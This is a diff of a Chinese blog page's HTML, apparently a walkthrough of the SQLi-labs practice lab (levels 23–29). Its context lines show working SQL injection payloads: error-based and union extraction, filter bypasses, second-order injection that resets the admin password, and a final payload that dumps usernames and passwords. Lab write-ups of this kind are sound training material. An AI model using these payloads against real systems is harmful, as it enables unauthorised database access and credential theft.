@@ -57,7 +57,7 @@
 <meta property="og:image" content="https://echozt.github.io/posts/fb8a/29_7.png">
 <meta property="og:image" content="https://echozt.github.io/posts/fb8a/29_8.png">
 <meta property="article:published_time" content="2022-04-09T16:03:14.000Z">
-<meta property="article:modified_time" content="2022-09-05T12:34:05.492Z">
+<meta property="article:modified_time" content="2024-01-16T03:20:57.881Z">
 <meta property="article:author" content="echozt">
 <meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Web漏洞">
@@ -286,23 +286,27 @@
 
 id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/23.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="23-2获取数据库名"><a href="#23-2获取数据库名" class="headerlink" title="23.2获取数据库名"></a>23.2获取数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/23_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>或者使用：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and info() and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/23_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="23-3获取表名"><a href="#23-3获取表名" class="headerlink" title="23.3获取表名"></a>23.3获取表名</h3><p>其实我报错函数我比较喜欢用updatexml()，但是呢，当它只能显示32长度的内容，绕过获取的内容超过32字符就要采用字符串截取的方式。然后每次获取32字符串的内容。</p>
 <p>比如：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,31) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/23_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23_4.png" srcset="/img/loading.gif" lazyload class>
+
 <p>然后接着获取：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),32,62) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -311,17 +315,20 @@ id<span class="token operator">=</span>1<span class="token string">' and updatex
 <p>啊还有一小节，再来一个：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),63,93) from information_schema.tables where table_schema=database()),0x7e),1) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/23_6.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23_6.png" srcset="/img/loading.gif" lazyload class>
+
 <p>好了，完工。</p>
 <p>其实吧，该说不说，上面这种可能直接手工注入的时候会容易记忆一点，但如果要写成测试脚本的话，就还是使用floor()函数，比较好：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">' and (select count(*) from information_schema.tables group by concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e,floor(rand(0)*2))) and '</span>1<span class="token string">'='</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>好的，亏我以为floor()函数能一次性查出来所有的，原来也只能查到64字节，那剩下的字节就还是用substr()函数查出来吧。</p>
-<p> <img src="/posts/fb8a/23_7.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/23_7.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24 二次注入"></a>Less-24 二次注入</h1><p>本关为二次注入。</p>
 <p>二次注入含义：将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</p>
 <p>大致原理：先创建一个用户admin’#,再登录这个账号修改密码。原来的密码那里可以任意输，新密码自己设定。修改完成后会发现成功修改了已有账号admin的密码。</p>
-<h3 id="24-1先创建一个admin’-的账号"><a href="#24-1先创建一个admin’-的账号" class="headerlink" title="24.1先创建一个admin’#的账号"></a>24.1先创建一个admin’#的账号</h3><p> <img src="/posts/fb8a/24.png" srcset="/img/loading.gif" lazyload class></p>
+<h3 id="24-1先创建一个admin’-的账号"><a href="#24-1先创建一个admin’-的账号" class="headerlink" title="24.1先创建一个admin’#的账号"></a>24.1先创建一个admin’#的账号</h3><img src="/posts/fb8a/24.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"><a href="#24-2登录admin’-的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。" class="headerlink" title="24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。"></a>24.2登录admin’#的账号，并修改密码为123456。原来的密码可以随便输，因为会被注释掉。</h3><p>在源代码中的sql语句为：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='<span class="token variable">$pass</span>' where username='<span class="token variable">$username</span>' and password='<span class="token variable">$curr_pass</span>' "</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -329,8 +336,10 @@ id<span class="token operator">=</span>1<span class="token string">' and updatex
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$sql</span> <span class="token operator">=</span> "UPDATE <span class="token function">users</span> SET PASSWORD<span class="token operator">=</span><span class="token string">'<span class="token variable">$pass</span>'</span> where username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment" spellcheck="true">#' and password='$curr_pass' ";</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>所以我们就可以变成修改admin的密码了。</p>
-<p> <img src="/posts/fb8a/24_2.png" srcset="/img/loading.gif" lazyload class></p>
-<h3 id="24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"><a href="#24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456" class="headerlink" title="24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"></a>24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456</h3><p> <img src="/posts/fb8a/23_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/24_2.png" srcset="/img/loading.gif" lazyload class>
+
+<h3 id="24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"><a href="#24-3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456" class="headerlink" title="24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456"></a>24.3可以看到数据库中，admin的密码由原来的admin被改成了我们所修改的123456</h3><img src="/posts/fb8a/23_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="and和or绕过-Less-25-Less25a"><a href="#and和or绕过-Less-25-Less25a" class="headerlink" title="and和or绕过(Less-25~Less25a)"></a>and和or绕过(Less-25~Less25a)</h1><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>本关对or和and进行了过滤。要绕过or和and，构造其他的注入语句。</p>
 <h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>尝试双写绕过。即双写关键字，可将and写为anandd，or写成oorr,发现成功绕过了耶。</p>
 <h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>可尝试将and替换成&amp;&amp;，or替换成||。这里我试了一下用||可以，但&amp;&amp;不可以，因为&amp;在数据包里面相当于里面的参数连接符，可以将&amp;&amp;进行url编码成%26%26使用。</p>
@@ -344,11 +353,13 @@ id<span class="token operator">=</span>1' anandd updatexml<span class="token pun
 
 id<span class="token operator">=</span>1' anandd info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/25_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/25_2.png" srcset="/img/loading.gif" lazyload class>
+
 <p>或者使用：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/25_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/25_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>本关错误时不会显示错在哪里了，所以不能采用报错注入。并且也对and和or进行了过滤。</p>
 <p>当使用id=1 || 1=1出现正确信息，说明在源码中id=$id。</p>
 <p>可以使用延时注入和布尔盲注。</p>
@@ -362,7 +373,8 @@ id<span class="token operator">=</span>1 anandd substr<span class="token punctua
 id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p>
-<p> <img src="/posts/fb8a/25a.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/25a.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="空格字符绕过-Less-26-Less26a"><a href="#空格字符绕过-Less-26-Less26a" class="headerlink" title="空格字符绕过(Less-26~Less26a)"></a>空格字符绕过(Less-26~Less26a)</h1><h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>本关将or,and,空格,/*,#,–,/等各种字符就进行了过滤。</p>
 <p>空格字符绕过：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">%20 %09 %0a %0b %0c %0d %a0 /**/ +
@@ -371,7 +383,8 @@ id<span class="token operator">=</span>1 anandd substr<span class="token punctua
 
 id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,user(),0x7e),1)+||+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/26.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/26.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">'+||+info()+||+'</span>1
@@ -380,31 +393,36 @@ id<span class="token operator">=</span>1<span class="token string">'+||+info()+|
 
 id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,database(),0x7e),1)+||+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/26_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/26_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关过滤的字符跟第二十六关一样，闭合方式是’) 并且不能用报错注入了，因为不会显示错在哪里了。可以采用union联合注入或盲注。</p>
 <h3 id="下面采用union联合注入："><a href="#下面采用union联合注入：" class="headerlink" title="下面采用union联合注入："></a>下面采用union联合注入：</h3><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,database(),3+||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里的999为一个不存在的值，%0b可以用%a0代替，其他不行，可能是系统问题。</p>
-<p>  <img src="/posts/fb8a/26a.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/26a.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得用户名"><a href="#②获得用户名" class="headerlink" title="②获得用户名"></a>②获得用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,user(),3+||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/26a_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/26a_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="③获得表名"><a href="#③获得表名" class="headerlink" title="③获得表名"></a>③获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/26a_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/26a_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h1 id="union和select绕过-Less-27-Less-28a"><a href="#union和select绕过-Less-27-Less-28a" class="headerlink" title="union和select绕过(Less-27~Less-28a)"></a>union和select绕过(Less-27~Less-28a)</h1><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>本关主要是union、select字符和26关过滤掉的字符。</p>
 <p>如果要用到union和select的话，可以使用大小写混写或者双写关键字绕过。</p>
 <h3 id="可以采用报错注入："><a href="#可以采用报错注入：" class="headerlink" title="可以采用报错注入："></a>可以采用报错注入：</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,user(),0x7e),1)+and+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/27.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/27.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名："><a href="#②获得数据库名：" class="headerlink" title="②获得数据库名："></a>②获得数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 1<span class="token string">'+and%a0info()+and+'</span>1
@@ -413,13 +431,15 @@ id<span class="token operator">=</span>1<span class="token string">'+and%a0updat
 
 id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,database(),0x7e),1)+and+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/27_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/27_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关过滤的字符跟第二十七关一样，闭合方式为”并且不能采用报错注入了。</p>
 <h3 id="可以采用union联合注入（union和select大小写混写）："><a href="#可以采用union联合注入（union和select大小写混写）：" class="headerlink" title="可以采用union联合注入（union和select大小写混写）："></a>可以采用union联合注入（union和select大小写混写）：</h3><h4 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,user(),3+||+"</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/27a.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/27a.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,database(),3+||+"</span>1
@@ -431,12 +451,14 @@ id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0S
 
 id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,database(),3+||+('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/28.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/28.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获得数据库用户名"><a href="#②获得数据库用户名" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,user(),3+||+('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>  <img src="/posts/fb8a/28_2.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/28_2.png" srcset="/img/loading.gif" lazyload class>
+
 <h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>用第二十八关的payload一样可以</p>
 <h1 id="HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31"><a href="#HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31" class="headerlink" title="HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)"></a>HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)</h1><p>这三关是要搭建环境才能实现的。好像要在Ubuntu下，并且要下载tomcat，jdk等等。想了想，了解下原理，还是在PHP环境下绕过得了。</p>
 <p>这里的两层架构的工作流程为：</p>
@@ -448,37 +470,44 @@ id<span class="token operator">=</span>999<span class="token string">') union%a0
 
 id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="②获取数据库名-2"><a href="#②获取数据库名-2" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29_2.png" srcset="/img/loading.gif" lazyload class> </p>
+<img src="/posts/fb8a/29_2.png" srcset="/img/loading.gif" lazyload class> 
+
 <h3 id="（2）使用联合注入"><a href="#（2）使用联合注入" class="headerlink" title="（2）使用联合注入"></a>（2）使用联合注入</h3><p>其实吧，我一般不怎么用union，因为还要先判断字段和注入点。好久没用了，还是用一下吧。</p>
 <h4 id="①先判断有几个字段"><a href="#①先判断有几个字段" class="headerlink" title="①先判断有几个字段"></a>①先判断有几个字段</h4><p>当输到id=1’ order by 4–+时报错，说明有三个字段</p>
 <h4 id="②找注入点"><a href="#②找注入点" class="headerlink" title="②找注入点"></a>②找注入点</h4><p>id=-1’ union select  1,2,3–+</p>
 <p>可以看到在2,3的位置都可以写注入语句。</p>
-<p>  <img src="/posts/fb8a/29_3.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29_3.png" srcset="/img/loading.gif" lazyload class>
+
 <h4 id="③构造union语句"><a href="#③构造union语句" class="headerlink" title="③构造union语句"></a>③构造union语句</h4><h3 id="29-1获得数据库用户名"><a href="#29-1获得数据库用户名" class="headerlink" title="29.1获得数据库用户名"></a>29.1获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,user<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29_4.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29_4.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="29-2获得数据库名"><a href="#29-2获得数据库名" class="headerlink" title="29.2获得数据库名"></a>29.2获得数据库名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29_5.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29_5.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="29-3获得表名"><a href="#29-3获得表名" class="headerlink" title="29.3获得表名"></a>29.3获得表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29_6.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29_6.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="29-4获得字段名"><a href="#29-4获得字段名" class="headerlink" title="29.4获得字段名"></a>29.4获得字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>-1<span class="token string">' union select  1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>users'<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p> <img src="/posts/fb8a/29_7.png" srcset="/img/loading.gif" lazyload class></p>
+<img src="/posts/fb8a/29_7.png" srcset="/img/loading.gif" lazyload class>
+
 <h3 id="29-5获取用户名和密码"><a href="#29-5获取用户名和密码" class="headerlink" title="29.5获取用户名和密码"></a>29.5获取用户名和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>-1' union <span class="token keyword">select</span>  1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 1<span class="token punctuation">)</span>--+
